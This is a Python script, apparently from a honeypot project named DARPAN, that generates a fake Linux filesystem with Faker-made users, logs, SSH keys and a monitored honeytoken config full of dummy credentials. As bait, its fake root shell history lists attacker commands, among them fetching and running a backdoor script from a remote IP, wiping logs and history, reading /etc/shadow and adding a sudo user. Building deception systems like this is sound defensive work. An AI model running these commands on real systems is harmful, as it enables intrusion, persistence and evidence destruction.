#!/usr/bin/env python3
"""
DARPAN Polymorphic Honeyfs Generator
Generates a realistic fake Linux filesystem using Faker to defeat
automated fingerprinting tools that cache filesystem state.
"""
import argparse
import hashlib
import os
import random
import stat
import string
import sys
from datetime import datetime, timedelta
from pathlib import Path

from faker import Faker

fake = Faker()
Faker.seed(int(datetime.now().timestamp()))

HOSTNAME = "ubuntu-prod-srv-01"
DOMAIN = "corp.internal"
APP_DB_CRED_PATH = "/opt/app/config.yml"

MANIFEST: list[dict] = []


def _write(base: Path, rel_path: str, content: str, mode: int = 0o644) -> Path:
    full = base / rel_path.lstrip("/")
    full.parent.mkdir(parents=True, exist_ok=True)
    full.write_text(content, encoding="utf-8")
    os.chmod(full, mode)
    MANIFEST.append({
        "path": rel_path,
        "size": len(content),
        "sha256": hashlib.sha256(content.encode()).hexdigest()[:16],
        "honeytoken": "HONEYTOKEN" in content or "config.yml" in rel_path,
    })
    return full


def gen_passwd(base: Path) -> None:
    system_users = [
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
        "sync:x:4:65534:sync:/bin:/bin/sync",
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
        "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
        "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
        "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
        "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
        "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
        "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "syslog:x:104:110::/home/syslog:/usr/sbin/nologin",
        "messagebus:x:105:111::/nonexistent:/usr/sbin/nologin",
        "sshd:x:109:65534::/run/sshd:/usr/sbin/nologin",
    ]
    service_accounts = [
        ("deploy", 1001, 1001, "Deploy Service", "/home/deploy", "/bin/bash"),
        ("jenkins", 1002, 1002, "Jenkins CI", "/var/lib/jenkins", "/bin/bash"),
        ("postgres", 1003, 1003, "PostgreSQL", "/var/lib/postgresql", "/bin/bash"),
        ("redis", 1004, 1004, "Redis Server", "/var/lib/redis", "/usr/sbin/nologin"),
        ("nginx", 1005, 1005, "nginx user", "/nonexistent", "/usr/sbin/nologin"),
        ("docker", 1006, 1006, "Docker User", "/var/lib/docker", "/usr/sbin/nologin"),
        ("backup", 1007, 1007, "Backup Service", "/home/backup", "/bin/bash"),
    ]
    fake_users = []
    for i in range(8):
        uid = 1100 + i
        name = fake.user_name()[:12]
        gecos = fake.name()
        shell = random.choice(["/bin/bash", "/bin/sh", "/usr/sbin/nologin"])
        fake_users.append(f"{name}:x:{uid}:{uid}:{gecos}:/home/{name}:{shell}")

    lines = system_users + [
        f"{u[0]}:x:{u[1]}:{u[2]}:{u[3]}:{u[4]}:{u[5]}" for u in service_accounts
    ] + fake_users
    _write(base, "/etc/passwd", "\n".join(lines) + "\n")


def gen_hostname(base: Path) -> None:
    _write(base, "/etc/hostname", HOSTNAME + "\n")


def gen_hosts(base: Path) -> None:
    lines = [
        "127.0.0.1\tlocalhost",
        "127.0.1.1\t" + HOSTNAME,
        "::1\tlocalhost ip6-localhost ip6-loopback",
        "ff02::1\tip6-allnodes",
        "ff02::2\tip6-allrouters",
        "",
        "# Internal network",
    ]
    for i in range(1, 16):
        ip = f"10.0.1.{i}"
        host = f"app-node-{i:02d}.{DOMAIN}"
        lines.append(f"{ip}\t{host}")
    lines += [
        f"10.0.1.20\tdb-primary.{DOMAIN}",
        f"10.0.1.21\tdb-replica.{DOMAIN}",
        f"10.0.1.30\tjenkins.{DOMAIN}",
        f"10.0.1.40\tnexus.{DOMAIN}",
        f"10.0.2.1\tgateway.{DOMAIN}",
    ]
    _write(base, "/etc/hosts", "\n".join(lines) + "\n")


def gen_crontab(base: Path) -> None:
    crontab = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user\tcommand
17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly
25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
"""
    _write(base, "/etc/crontab", crontab)

    cron_jobs = [
        ("backup", "0 2 * * *", "deploy", f"/usr/local/bin/backup.sh >> /var/log/backup.log 2>&1"),
        ("db-cleanup", "30 3 * * 0", "postgres", f"/opt/scripts/db_cleanup.py"),
        ("log-rotate", "0 0 * * *", "root", "/usr/sbin/logrotate /etc/logrotate.conf"),
        ("health-check", "*/5 * * * *", "deploy", f"/opt/app/health_check.sh"),
        ("cert-renew", "0 12 * * *", "root", "certbot renew --quiet"),
    ]
    for name, schedule, user, cmd in cron_jobs:
        content = f"# DARPAN cron job: {name}\n{schedule}\t{user}\t{cmd}\n"
        _write(base, f"/etc/cron.d/{name}", content)


def gen_bash_history(base: Path, username: str, uid: int) -> None:
    sysadmin_cmds = [
        "ls -la", "pwd", "whoami", "id", "uname -a",
        "df -h", "free -m", "top -bn1", "ps aux",
        "netstat -tulnp", "ss -tulnp",
        "cat /etc/os-release", "lscpu",
        "systemctl status nginx", "systemctl restart nginx",
        "journalctl -f", "journalctl -u nginx --since '1 hour ago'",
        "tail -f /var/log/nginx/access.log",
        "tail -100 /var/log/syslog",
        "grep 'ERROR' /var/log/app/app.log | tail -20",
        "docker ps", "docker ps -a",
        "docker logs app-container --tail 50",
        "docker exec -it app-container /bin/bash",
        "docker-compose up -d", "docker-compose logs -f",
        "docker image prune -f",
        "git status", "git log --oneline -20",
        "git pull origin main",
        "git diff HEAD~1",
        "git stash", "git stash pop",
        "cd /opt/app && git log --oneline -10",
        "kubectl get pods -n production",
        "kubectl logs -f deployment/api-server -n production",
        "kubectl rollout status deployment/api-server",
        "kubectl describe pod api-server-xxx",
        "ansible-playbook -i inventory/prod site.yml --check",
        "ssh deploy@app-node-01.corp.internal",
        "scp backup.tar.gz backup@10.0.1.20:/backups/",
        "rsync -avz /opt/app/ deploy@app-node-02:/opt/app/",
        "crontab -l", "crontab -e",
        "nano /etc/nginx/nginx.conf",
        "vim /opt/app/config.yml",
        "sudo systemctl reload nginx",
        "sudo ufw status", "sudo ufw allow 8443/tcp",
        "openssl x509 -in /etc/ssl/certs/app.crt -text -noout",
        "htop", "iotop", "iftop",
        "du -sh /var/log/*", "du -sh /opt/*",
        "find /var/log -name '*.gz' -mtime +30 -delete",
        "tar -czf /backup/app_$(date +%Y%m%d).tar.gz /opt/app/",
        "mysql -u root -p -e 'SHOW DATABASES;'",
        "psql -U postgres -c '\\l'",
        "redis-cli INFO server",
        "curl -s http://localhost:8080/health",
        "wget -qO- http://localhost:9090/metrics | head -20",
        "pip3 install -r requirements.txt",
        "python3 manage.py migrate",
        "python3 manage.py collectstatic --noinput",
        "npm install", "npm run build", "npm run test",
        "sudo apt update && sudo apt list --upgradable",
        "sudo apt-get upgrade -y",
        "history | grep deploy",
        "env | grep -v SECRET",
        "cat /proc/cpuinfo | grep 'model name' | head -1",
        "uptime", "last | head -20",
    ]
    history = random.sample(sysadmin_cmds, min(50, len(sysadmin_cmds)))
    _write(base, f"/home/{username}/.bash_history", "\n".join(history) + "\n", 0o600)


def gen_authorized_keys(base: Path, username: str) -> None:
    keys = []
    for _ in range(random.randint(1, 3)):
        b64 = "".join(random.choices(string.ascii_letters + string.digits + "+/", k=372))
        comment = f"{fake.user_name()}@{fake.hostname()}"
        keys.append(f"ssh-rsa AAAA{b64}= {comment}")
    _write(base, f"/home/{username}/.ssh/authorized_keys",
           "\n".join(keys) + "\n", 0o600)


def gen_auth_log(base: Path) -> None:
    lines = []
    base_time = datetime.now() - timedelta(days=30)
    hostnames = [f"app-node-{i:02d}.corp.internal" for i in range(1, 6)]
    users = ["deploy", "root", "ubuntu", "jenkins", "backup"]
    ips = [fake.ipv4() for _ in range(20)]

    for i in range(200):
        t = base_time + timedelta(seconds=i * random.randint(600, 3600))
        ts = t.strftime("%b %d %H:%M:%S")
        host = HOSTNAME
        action = random.choices(
            ["accepted", "failed", "invalid"],
            weights=[60, 30, 10]
        )[0]
        user = random.choice(users)
        ip = random.choice(ips)
        port = random.randint(32768, 65535)
        if action == "accepted":
            lines.append(f"{ts} {host} sshd[{random.randint(1000,9999)}]: "
                         f"Accepted publickey for {user} from {ip} port {port} "
                         f"ssh2: RSA SHA256:{fake.sha256()[:43]}")
        elif action == "failed":
            lines.append(f"{ts} {host} sshd[{random.randint(1000,9999)}]: "
                         f"Failed password for {user} from {ip} port {port} ssh2")
        else:
            lines.append(f"{ts} {host} sshd[{random.randint(1000,9999)}]: "
                         f"Invalid user {fake.user_name()} from {ip} port {port}")
    _write(base, "/var/log/auth.log", "\n".join(lines) + "\n", 0o640)


def gen_syslog(base: Path) -> None:
    lines = []
    base_time = datetime.now() - timedelta(days=7)
    services = ["kernel", "systemd", "NetworkManager", "dockerd", "sshd",
                "cron", "nginx", "rsyslogd", "auditd"]
    messages = [
        "Starting session {n} of user {u}.",
        "New session {n} for user {u}.",
        "Removed session {n}.",
        "Started Daily apt download activities.",
        "Finished Daily apt download activities.",
        "pam_unix(cron:session): session opened for user root",
        "pam_unix(cron:session): session closed for user root",
        "CRON[{n}]: (root) CMD (run-parts --report /etc/cron.hourly)",
        "NetworkManager: <info> [1234567890.0] dhcp4: state changed",
        "dockerd: time=\"{ts}\" level=info msg=\"Container started\"",
        "rsyslogd: [origin software=\"rsyslogd\" version=\"8.2302.0\"] start",
        "kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST={dst} LEN=44",
        "nginx[{n}]: Starting nginx: nginx.",
        "auditd[{n}]: audit dispatcher initialized",
        "systemd[1]: Reloading.",
    ]
    for i in range(500):
        t = base_time + timedelta(seconds=i * random.randint(30, 300))
        ts = t.strftime("%b %d %H:%M:%S")
        service = random.choice(services)
        msg_tmpl = random.choice(messages)
        msg = msg_tmpl.format(
            n=random.randint(1000, 9999),
            u=random.choice(["root", "deploy", "ubuntu"]),
            ts=t.isoformat(),
            ip=fake.ipv4(),
            dst="10.0.1.1",
        )
        lines.append(f"{ts} {HOSTNAME} {service}: {msg}")
    _write(base, "/var/log/syslog", "\n".join(lines) + "\n", 0o640)


def gen_root_history(base: Path) -> None:
    root_cmds = [
        "mysqldump -u root -pP@ssw0rd! --all-databases > /tmp/all_db_backup.sql",
        "tar -czf /tmp/backup.tar.gz /var/www/html/",
        "find / -perm -4000 -type f 2>/dev/null",
        "cat /etc/shadow",
        "cat /etc/passwd",
        "nmap -sV -p- 10.0.1.0/24",
        "iptables -L -n -v",
        "netstat -anltp",
        "ps auxwww",
        "lsof -i",
        "ss -tulnp",
        "crontab -l",
        "ls /home/",
        "cat /root/.ssh/authorized_keys",
        "cat /root/.bash_history",
        "history -c && history -w",
        "echo '' > /var/log/auth.log",
        "unset HISTFILE",
        "export HISTFILESIZE=0",
        "chmod 777 /tmp/shell.sh",
        "/tmp/shell.sh",
        "wget http://192.168.1.100/backdoor.sh -O /tmp/bd.sh",
        "chmod +x /tmp/bd.sh && /tmp/bd.sh",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "stty raw -echo; fg",
        "id && whoami && uname -a",
        "sudo -l",
        "sudo su -",
        "passwd root",
        "useradd -m -s /bin/bash -G sudo maintainer",
    ]
    _write(base, "/root/.bash_history", "\n".join(root_cmds) + "\n", 0o600)


def gen_honeytoken_config(base: Path) -> None:
    db_host = f"db-primary.{DOMAIN}"
    db_pass = fake.password(length=20, special_chars=True)
    secret_key = "".join(random.choices(string.ascii_letters + string.digits, k=50))
    api_key = "ak-" + "".join(random.choices(string.hexdigits.lower(), k=40))

    content = f"""# Application Configuration
# HONEYTOKEN — access to this file is monitored
app:
  name: "ProductionAPI"
  version: "3.2.1"
  environment: production
  debug: false
  secret_key: "{secret_key}"

database:
  host: "{db_host}"
  port: 5432
  name: "prod_db"
  username: "app_user"
  password: "{db_pass}"
  ssl: true
  pool_size: 20

redis:
  host: "redis.{DOMAIN}"
  port: 6379
  password: "{fake.password(length=16)}"
  db: 0

api:
  anthropic_key: "{api_key}"
  rate_limit: 1000
  timeout: 30

storage:
  s3_bucket: "prod-uploads-{fake.uuid4()[:8]}"
  aws_access_key: "AKIA{fake.lexify('??????????????????').upper()}"
  aws_secret_key: "{fake.password(length=40)}"
  region: "us-east-1"

monitoring:
  datadog_api_key: "{fake.uuid4()}"
  sentry_dsn: "https://{fake.md5()[:32]}@sentry.io/{random.randint(100000,999999)}"
"""
    _write(base, "/opt/app/config.yml", content, 0o640)


def gen_tmp_files(base: Path) -> None:
    sh_content = f"""#!/bin/bash
# Maintenance script
BACKUP_DIR="/var/backup"
LOG="/var/log/maintenance.log"
date >> "$LOG"
echo "Running maintenance tasks..." >> "$LOG"
find /tmp -mtime +7 -delete 2>/dev/null
find /var/log -name "*.gz" -mtime +30 -delete 2>/dev/null
echo "Done." >> "$LOG"
"""
    _write(base, "/tmp/maintenance.sh", sh_content, 0o755)

    py_content = f"""#!/usr/bin/env python3
# Health check script
import requests
import sys

ENDPOINTS = [
    "http://localhost:8080/health",
    "http://localhost:9090/metrics",
]

for ep in ENDPOINTS:
    try:
        r = requests.get(ep, timeout=5)
        print(f"[OK] {{ep}} -> {{r.status_code}}")
    except Exception as e:
        print(f"[FAIL] {{ep}} -> {{e}}")
        sys.exit(1)
"""
    _write(base, "/tmp/health_check.py", py_content, 0o644)

    _write(base, "/tmp/data.bin",
           "ELF\x7f" + "".join(random.choices(string.printable, k=64)),
           0o755)


def main() -> None:
    parser = argparse.ArgumentParser(description="DARPAN Honeyfs Generator")
    parser.add_argument("--output", default="/opt/darpan/reflector/honeyfs",
                        help="Output directory for honeyfs")
    args = parser.parse_args()

    base = Path(args.output)
    base.mkdir(parents=True, exist_ok=True)

    print(f"[DARPAN] Generating polymorphic honeyfs → {base}")

    # Primary fake user
    username = fake.user_name()[:12]
    uid = random.randint(1100, 1200)

    gen_passwd(base)
    gen_hostname(base)
    gen_hosts(base)
    gen_crontab(base)
    gen_bash_history(base, username, uid)
    gen_authorized_keys(base, username)
    gen_auth_log(base)
    gen_syslog(base)
    gen_root_history(base)
    gen_honeytoken_config(base)
    gen_tmp_files(base)

    # ── Manifest ──────────────────────────────────────────────────────────────
    print(f"\n[DARPAN] Honeyfs manifest ({len(MANIFEST)} files):")
    print(f"  {'Path':<45} {'Size':>8}  {'SHA256':>16}  {'Honeytoken'}")
    print("  " + "-" * 78)
    for entry in MANIFEST:
        flag = "⚑ HONEYTOKEN" if entry["honeytoken"] else ""
        print(f"  {entry['path']:<45} {entry['size']:>8}b  {entry['sha256']:>16}  {flag}")
    print(f"\n[DARPAN] Generation complete. Primary user: {username}")


if __name__ == "__main__":
    main()
